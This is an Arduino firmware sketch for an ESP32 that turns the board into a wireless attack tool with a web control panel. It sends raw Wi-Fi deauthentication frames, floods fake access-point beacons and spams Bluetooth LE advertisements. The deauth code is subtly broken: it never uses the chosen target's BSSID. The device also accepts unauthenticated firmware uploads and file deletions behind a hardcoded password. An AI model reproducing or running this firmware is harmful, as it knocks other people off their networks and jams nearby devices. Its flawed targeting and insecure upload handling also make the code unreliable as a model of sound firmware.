#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <Update.h>
#include <ArduinoJson.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_wifi.h>
#include <esp_random.h>

// === PINS ===
#define LED_PIN   47
#define BTN1      45
#define BTN2      46

WebServer server(80);

const char* ssid = "ChiperOS";
const char* pass = "plusX123";
IPAddress ip(192, 100, 0, 1);

// === DEAUTH VARIABLES ===
bool deauthRunning = false;
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;
uint8_t deauthFrame[26];
const char* fakeMAC = "A2:B4:C5:D6:E7:F3";

// === BLE SPAM ===
bool bleSpamRunning = false;
unsigned long lastBlePacket = 0;

// === FAKE AP ===
bool fakeAPRunning = false;
String fakeAPNames[6] = {"LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO"};
int fakeAPCount = 6;

// === SCAN RESULTS ===
int scanCount = 0;
String scanSSIDs[20];
String scanBSSIDs[20];
int scanRSSIs[20];
int scanChannels[20];

// === TIMING ===
unsigned long lastDeauthSend = 0;
unsigned long lastFakeAPSend = 0;
// Forward declarations
void handleUpload();
void handleFileList();
void handleDeleteFile();
void handleScan();
void handleDeauthStart();
void handleDeauthStop();
void handleBLEStart();
void handleBLEStop();
void handleFakeAPStart();
void handleFakeAPStop();
void handleFakeAPConfig();
void sendDeauthPacket();
void sendFakeAP();

// === WEB INTERFACE ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>ChiperOS - WiFi Tools</title><style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0d1117;color:#58a6ff;font-family:'Courier New',monospace;padding:20px;}
h1{color:#7ee787;text-align:center;margin-bottom:20px;}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin-bottom:15px;}
h2{color:#58a6ff;font-size:16px;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:5px;}
.btn{padding:8px 15px;border:none;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold;}
.btn-primary{background:#238636;color:#fff;}
.btn-danger{background:#da3633;color:#fff;}
.btn-warning{background:#9e6a03;color:#fff;}
.btn-success{background:#3fb950;color:#000;}
.btn:hover{opacity:0.8;}
.network-item{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;margin:5px 0;cursor:pointer;}
.network-item:hover{border-color:#58a6ff;}
.network-item.selected{border-color:#3fb950;background:#1a2f1a;}
.network-name{color:#7ee787;font-weight:bold;}
.network-bssid{color:#8b949e;font-size:12px;}
.network-rssi{color:#f0883e;font-size:12px;}
.status{padding:10px;border-radius:5px;margin:10px 0;text-align:center;}
.status-on{background:#238636;color:#fff;}
.status-off{background:#30363d;color:#8b949e;}
input,select{background:#0d1117;color:#fff;border:1px solid #30363d;padding:8px;border-radius:5px;margin:5px 0;width:100%;}
.file-item{background:#0d1117;padding:10px;margin:5px 0;border-radius:5px;display:flex;justify-content:space-between;}
#log{background:#0d1117;padding:10px;border-radius:5px;margin-top:10px;font-size:12px;min-height:40px;}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
</style></head><body>
<h1>🛡️ ChiperOS</h1>

<div class="card">
<h2>📡 WiFi Scan</h2>
<button class="btn btn-primary" onclick="scan()">🔍 Scan Networks</button>
<div id="networks" style="margin-top:10px;">No networks scanned</div></div>

<div class="card">
<h2>📶 WiFi Deauther</h2>
<div id="deauthStatus" class="status status-off">Deauth: OFF</div>
<div style="margin:10px 0;">
<label>Target MAC:</label>
<input type="text" id="targetMAC" value="A2:B4:C5:D6:E7:F3" readonly>
</div>
<button class="btn btn-danger" id="deauthBtn" onclick="toggleDeauth()">▶ Start Deauth</button>
</div>

<div class="card">
<h2>🦷 BLE Spam</h2>
<div id="bleStatus" class="status status-off">BLE Spam: OFF</div>
<button class="btn btn-warning" id="bleBtn" onclick="toggleBLE()">▶ Start BLE Spam</button>
</div>

<div class="card">
<h2>📡 Fake AP</h2>
<div id="fakeAPStatus" class="status status-off">Fake AP: OFF</div>
<div style="margin:10px 0;">
<label>Fake AP Names (comma separated):</label>
<input type="text" id="fakeAPNames" value="LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO">
</div>
<button class="btn btn-success" id="fakeAPBtn" onclick="toggleFakeAP()">▶ Start Fake AP</button>
<button class="btn btn-primary" onclick="saveFakeAPConfig()">💾 Save Config</button>
</div>

<div class="card">
<h2>📂 File Manager</h2>
<div id="fileList">Loading...</div>
<form method="POST" action="/upload" enctype="multipart/form-data" style="margin-top:10px;">
<input type="file" name="firmware" accept=".bin,.json,.js">
<button type="submit" class="btn btn-primary">📤 Upload</button>
</form>
</div>

<div class="card">
<h2>ℹ️ System Info</h2>
<div id="sysInfo">Loading...</div>
</div>

<div id="log">Ready</div>

<script>
let selectedNetwork=0;
let deauthActive=false,bleActive=false,fakeAPActive=false;

function log(msg){document.getElementById('log').innerHTML='⏱ '+new Date().toLocaleTimeString()+': '+msg;}
function scan(){
  log('🔍 Scanning...');
  fetch('/api/scan').then(r=>r.json()).then(d=>{
    let html='';
    for(let i=0;i<d.count;i++){
      html+='<div class="network-item" onclick="selectNet('+i+')"><div class="network-name">'+d.ssids[i]+'</div>';
      html+='<div class="network-bssid">BSSID: '+d.bssids[i]+'</div>';
      html+='<div class="network-rssi">RSSI: '+d.rssis[i]+' dBm | CH: '+d.channels[i]+'</div></div>';
    }
    document.getElementById('networks').innerHTML=html||'No networks found';
    log('Scan complete: '+d.count+' networks');
  });
}

function selectNet(i){
  selectedNetwork=i;
  document.querySelectorAll('.network-item').forEach((el,idx)=>{
    el.classList.toggle('selected',idx===i);
  });
  log('Selected network '+i);
}

function toggleDeauth(){
  deauthActive=!deauthActive;
  const btn=document.getElementById('deauthBtn');
  const status=document.getElementById('deauthStatus');
  if(deauthActive){
    fetch('/api/deauth/start?net='+selectedNetwork).then(()=>{
      btn.innerText='⏹ Stop Deauth';
      btn.classList.remove('btn-danger');
      btn.classList.add('btn-warning');
      status.className='status status-on';
      status.innerText='Deauth: ON (Target: '+selectedNetwork+')';
      log('Deauth started');
    });
  }else{
    fetch('/api/deauth/stop').then(()=>{
      btn.innerText='▶ Start Deauth';
      btn.classList.remove('btn-warning');
      btn.classList.add('btn-danger');
      status.className='status status-off';
      status.innerText='Deauth: OFF';
      log('Deauth stopped');
    });
  }
}

function toggleBLE(){
  bleActive=!bleActive;  const btn=document.getElementById('bleBtn');
  const status=document.getElementById('bleStatus');
  if(bleActive){
    fetch('/api/ble/start').then(()=>{
      btn.innerText='⏹ Stop BLE';
      status.className='status status-on';
      status.innerText='BLE Spam: ON';
      log('BLE Spam started');
    });
  }else{
    fetch('/api/ble/stop').then(()=>{
      btn.innerText='▶ Start BLE Spam';
      status.className='status status-off';
      status.innerText='BLE Spam: OFF';
      log('BLE Spam stopped');
    });
  }
}

function toggleFakeAP(){
  fakeAPActive=!fakeAPActive;
  const btn=document.getElementById('fakeAPBtn');
  const status=document.getElementById('fakeAPStatus');
  if(fakeAPActive){
    fetch('/api/fakeap/start').then(()=>{
      btn.innerText='⏹ Stop Fake AP';
      status.className='status status-on';
      status.innerText='Fake AP: ON';
      log('Fake AP started');
    });
  }else{
    fetch('/api/fakeap/stop').then(()=>{
      btn.innerText='▶ Start Fake AP';
      status.className='status status-off';
      status.innerText='Fake AP: OFF';
      log('Fake AP stopped');
    });
  }
}

function saveFakeAPConfig(){
  const names=document.getElementById('fakeAPNames').value;
  fetch('/api/fakeap/config?names='+encodeURIComponent(names)).then(()=>{
    log('Fake AP config saved');
  });
}

function refreshFiles(){
  fetch('/api/files').then(r=>r.json()).then(d=>{
    let html='';    d.files.forEach(f=>{
      html+='<div class="file-item"><span>📄 '+f.name+' ('+f.size+'B)</span>';
      html+='<button class="btn btn-danger" onclick="del(\''+f.name+'\')">🗑</button></div>';
    });
    document.getElementById('fileList').innerHTML=html||'Empty';
  });
  fetch('/api/sysinfo').then(r=>r.json()).then(d=>{
    document.getElementById('sysInfo').innerHTML='Heap: '+d.heap+'B<br>PSRAM: '+d.psram+'B<br>Uptime: '+d.uptime+'s';
  });
}

function del(n){if(confirm('Delete '+n+'?')){fetch('/api/del?file='+n).then(()=>refreshFiles());}}

setInterval(refreshFiles,5000);
refreshFiles();
</script></body></html>
)rawliteral";

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  pinMode(BTN1, INPUT_PULLUP);
  pinMode(BTN2, INPUT_PULLUP);
  
  delay(3000);
  Serial.begin(115200);
  Serial.println("\n=== ChiperOS Boot ===");
  
  if (!LittleFS.begin(true)) Serial.println("⚠️ LittleFS format");
  else Serial.println("✅ LittleFS OK");
  
  // WiFi Station + AP
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, pass);
  Serial.printf("✅ AP: %s | IP: %s\n", ssid, ip.toString().c_str());
  
  // Initialize Deauth Frame
  initDeauthFrame();
  
  // Web Server
  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html; charset=utf-8", html);
    delay(1);
  });
  
  server.on("/api/scan", HTTP_GET, handleScan);
  server.on("/api/deauth/start", HTTP_GET, handleDeauthStart);
  server.on("/api/deauth/stop", HTTP_GET, handleDeauthStop);  server.on("/api/ble/start", HTTP_GET, handleBLEStart);
  server.on("/api/ble/stop", HTTP_GET, handleBLEStop);
  server.on("/api/fakeap/start", HTTP_GET, handleFakeAPStart);
  server.on("/api/fakeap/stop", HTTP_GET, handleFakeAPStop);
  server.on("/api/fakeap/config", HTTP_GET, handleFakeAPConfig);
  server.on("/api/files", HTTP_GET, handleFileList);
  server.on("/api/sysinfo", HTTP_GET, []() {
    String json = "{\"heap\":" + String(ESP.getFreeHeap()) + 
                  ",\"psram\":" + String(ESP.getPsramSize()) +
                  ",\"uptime\":" + String(millis()/1000) + "}";
    server.send(200, "application/json", json);
  });
  server.on("/api/del", HTTP_GET, handleDeleteFile);
  
  server.on("/upload", HTTP_POST, 
    []() {
      server.sendHeader("Connection", "close");
      server.send(200, "text/plain", "OK");
      digitalWrite(LED_PIN, HIGH);
      delay(1000);
      ESP.restart();
    },
    handleUpload
  );
  
  server.begin();
  Serial.println("✅ Server ready");
  
  // BLE Init
  BLEDevice::init("ESP32-S3");
  Serial.println("✅ BLE initialized");
  
  Serial.println("=== READY ===");
}

void loop() {
  server.handleClient();
  
  // Deauth Loop
  if (deauthRunning && millis() - lastDeauthSend > 100) {
    lastDeauthSend = millis();
    sendDeauthPacket();
  }
  
  // BLE Spam Loop
  if (bleSpamRunning && millis() - lastBlePacket > 100) {
    lastBlePacket = millis();
    sendBLESpam();
  }
    // Fake AP Loop
  if (fakeAPRunning && millis() - lastFakeAPSend > 200) {
    lastFakeAPSend = millis();
    sendFakeAP();
  }
  
  // LED Blink
  static unsigned long lastLed = 0;
  if (millis() - lastLed > 500) {
    lastLed = millis();
    digitalWrite(LED_PIN, (deauthRunning || bleSpamRunning || fakeAPRunning) ? !digitalRead(LED_PIN) : LOW);
  }
  
  yield();
}

void initDeauthFrame() {
  // Deauth frame template
  deauthFrame[0] = 0xC0; // Deauth frame type
  deauthFrame[1] = 0x00;
  deauthFrame[2] = 0x3A; // Duration
  deauthFrame[3] = 0x01;
  // Destination (broadcast)
  deauthFrame[4] = 0xFF;
  deauthFrame[5] = 0xFF;
  deauthFrame[6] = 0xFF;
  deauthFrame[7] = 0xFF;
  deauthFrame[8] = 0xFF;
  deauthFrame[9] = 0xFF;
  // Source (fake MAC)
  deauthFrame[10] = 0xA2;
  deauthFrame[11] = 0xB4;
  deauthFrame[12] = 0xC5;
  deauthFrame[13] = 0xD6;
  deauthFrame[14] = 0xE7;
  deauthFrame[15] = 0xF3;
  // BSSID (same as source)
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);
  // Sequence control
  deauthFrame[22] = 0x00;
  deauthFrame[23] = 0x00;
  // Reason code (0x0002 = Previous authentication no longer valid)
  deauthFrame[24] = 0x02;
  deauthFrame[25] = 0x00;
}

void sendDeauthPacket() {
  // Set channel
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    // Randomize sequence number
  deauthFrame[22] = esp_random() & 0xFF;
  deauthFrame[23] = (esp_random() >> 8) & 0xFF;
  
  // Send deauth frame
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  
  Serial.println("📡 Deauth sent");
}

void sendBLESpam() {
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->stop();
  
  // Generate random service UUID
  uint16_t serviceUUID = 0x1800 + (esp_random() % 0x100);
  BLEUUID uuid(serviceUUID);
  
  pAdvertising->addServiceUUID(uuid);
  pAdvertising->setMinPreferred(0x06);
  pAdvertising->setMaxPreferred(0x12);
  pAdvertising->start();
  
  Serial.println("🦷 BLE spam sent");
}

void sendFakeAP() {
  static int apIndex = 0;
  
  // Send beacon frame for fake AP
  uint8_t beaconFrame[128];
  memset(beaconFrame, 0, sizeof(beaconFrame));
  
  // Beacon frame header
  beaconFrame[0] = 0x80; // Type: Management, Subtype: Beacon
  beaconFrame[1] = 0x00;
  beaconFrame[2] = 0x00; // Duration
  beaconFrame[3] = 0x00;
  
  // Destination (broadcast)
  memset(&beaconFrame[4], 0xFF, 6);
  
  // Source (random MAC)
  beaconFrame[10] = 0x02;
  beaconFrame[11] = 0x00;
  beaconFrame[12] = 0x00;
  beaconFrame[13] = 0x00;
  beaconFrame[14] = 0x00;
  beaconFrame[15] = 0x00 + apIndex;
    // BSSID (same as source)
  memcpy(&beaconFrame[16], &beaconFrame[10], 6);
  
  // Sequence control
  beaconFrame[22] = 0x00;
  beaconFrame[23] = 0x00;
  
  // Timestamp
  uint64_t timestamp = millis() * 1000;
  memcpy(&beaconFrame[24], &timestamp, 8);
  
  // Beacon interval
  beaconFrame[32] = 0xE8;
  beaconFrame[33] = 0x03;
  
  // Capability info
  beaconFrame[34] = 0x01;
  beaconFrame[35] = 0x00;
  
  // SSID element
  int pos = 36;
  String ssidName = fakeAPNames[apIndex % fakeAPCount];
  beaconFrame[pos++] = 0x00; // SSID element ID
  beaconFrame[pos++] = ssidName.length();
  memcpy(&beaconFrame[pos], ssidName.c_str(), ssidName.length());
  pos += ssidName.length();
  
  // Supported rates
  beaconFrame[pos++] = 0x01;
  beaconFrame[pos++] = 0x08;
  beaconFrame[pos++] = 0x82;
  beaconFrame[pos++] = 0x84;
  beaconFrame[pos++] = 0x8B;
  beaconFrame[pos++] = 0x96;
  beaconFrame[pos++] = 0x24;
  beaconFrame[pos++] = 0x30;
  beaconFrame[pos++] = 0x48;
  beaconFrame[pos++] = 0x6C;
  
  // Send beacon
  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, pos, false);
  
  apIndex = (apIndex + 1) % fakeAPCount;
  
  Serial.println("📡 Fake AP beacon: " + ssidName);
}

void handleScan() {
  Serial.println("🔍 Scanning networks...");
    scanCount = WiFi.scanNetworks();
  
  String json = "{\"count\":" + String(scanCount) + ",\"ssids\":[";
  String bssids = "\"bssids\":[";
  String rssis = "\"rssis\":[";
  String channels = "\"channels\":[";
  
  for (int i = 0; i < scanCount && i < 20; i++) {
    if (i > 0) {
      json += ",";
      bssids += ",";
      rssis += ",";
      channels += ",";
    }
    json += "\"" + WiFi.SSID(i) + "\"";
    bssids += "\"" + WiFi.BSSIDstr(i) + "\"";
    rssis += String(WiFi.RSSI(i));
    channels += String(WiFi.channel(i));
    
    scanSSIDs[i] = WiFi.SSID(i);
    scanBSSIDs[i] = WiFi.BSSIDstr(i);
    scanRSSIs[i] = WiFi.RSSI(i);
    scanChannels[i] = WiFi.channel(i);
  }
  
  json += "]," + bssids + "]," + rssis + "]," + channels + "]}";
  
  Serial.println("✅ Scan complete: " + String(scanCount) + " networks");
  server.send(200, "application/json", json);
}

void handleDeauthStart() {
  int netIndex = server.arg("net").toInt();
  
  if (netIndex >= 0 && netIndex < scanCount) {
    targetSSID = scanSSIDs[netIndex];
    targetBSSID = scanBSSIDs[netIndex];
    targetChannel = scanChannels[netIndex];
    
    deauthRunning = true;
    Serial.println("📡 Deauth started on " + targetSSID + " (CH:" + String(targetChannel) + ")");
    
    server.send(200, "text/plain", "OK");
  } else {
    server.send(400, "text/plain", "Invalid network index");
  }
}

void handleDeauthStop() {
  deauthRunning = false;  Serial.println("⏹ Deauth stopped");
  server.send(200, "text/plain", "OK");
}

void handleBLEStart() {
  bleSpamRunning = true;
  Serial.println("🦷 BLE spam started");
  server.send(200, "text/plain", "OK");
}

void handleBLEStop() {
  bleSpamRunning = false;
  BLEDevice::getAdvertising()->stop();
  Serial.println("⏹ BLE spam stopped");
  server.send(200, "text/plain", "OK");
}

void handleFakeAPStart() {
  fakeAPRunning = true;
  Serial.println("📡 Fake AP started");
  server.send(200, "text/plain", "OK");
}

void handleFakeAPStop() {
  fakeAPRunning = false;
  Serial.println("⏹ Fake AP stopped");
  server.send(200, "text/plain", "OK");
}

void handleFakeAPConfig() {
  String names = server.arg("names");
  
  // Parse comma-separated names
  int idx = 0;
  int start = 0;
  for (int i = 0; i <= names.length() && idx < 6; i++) {
    if (i == names.length() || names.charAt(i) == ',') {
      fakeAPNames[idx++] = names.substring(start, i);
      start = i + 1;
    }
  }
  fakeAPCount = idx;
  
  Serial.println("💾 Fake AP config saved: " + String(fakeAPCount) + " APs");
  server.send(200, "text/plain", "OK");
}

void handleUpload() {
  static File f;
  HTTPUpload& up = server.upload();  
  if (up.status == UPLOAD_FILE_START) {
    Serial.printf("Upload: %s\n", up.filename.c_str());
    if (up.filename.endsWith(".bin")) {
      Update.begin(UPDATE_SIZE_UNKNOWN, U_FLASH);
    } else {
      f = LittleFS.open("/" + up.filename, "w");
    }
  } else if (up.status == UPLOAD_FILE_WRITE) {
    if (up.filename.endsWith(".bin")) {
      Update.write(up.buf, up.currentSize);
    } else if (f) {
      f.write(up.buf, up.currentSize);
    }
  } else if (up.status == UPLOAD_FILE_END) {
    if (up.filename.endsWith(".bin")) {
      if (Update.end(true)) {
        Serial.println("✅ OTA Success");
      }
    } else if (f) {
      f.close();
    }
  }
}

void handleFileList() {
  File root = LittleFS.open("/");
  String json = "{\"files\":[";
  bool first = true;
  File file = root.openNextFile();
  while (file) {
    if (!first) json += ",";
    json += "{\"name\":\"" + String(file.name()) + "\",\"size\":" + String(file.size()) + "}";
    first = false;
    file = root.openNextFile();
  }
  json += "]}";
  server.send(200, "application/json", json);
}

void handleDeleteFile() {
  String file = server.arg("file");
  if (LittleFS.remove(file)) {
    Serial.println("🗑 Deleted: " + file);
    server.send(200, "text/plain", "OK");
  } else {
    server.send(500, "text/plain", "Delete failed");
  }
}
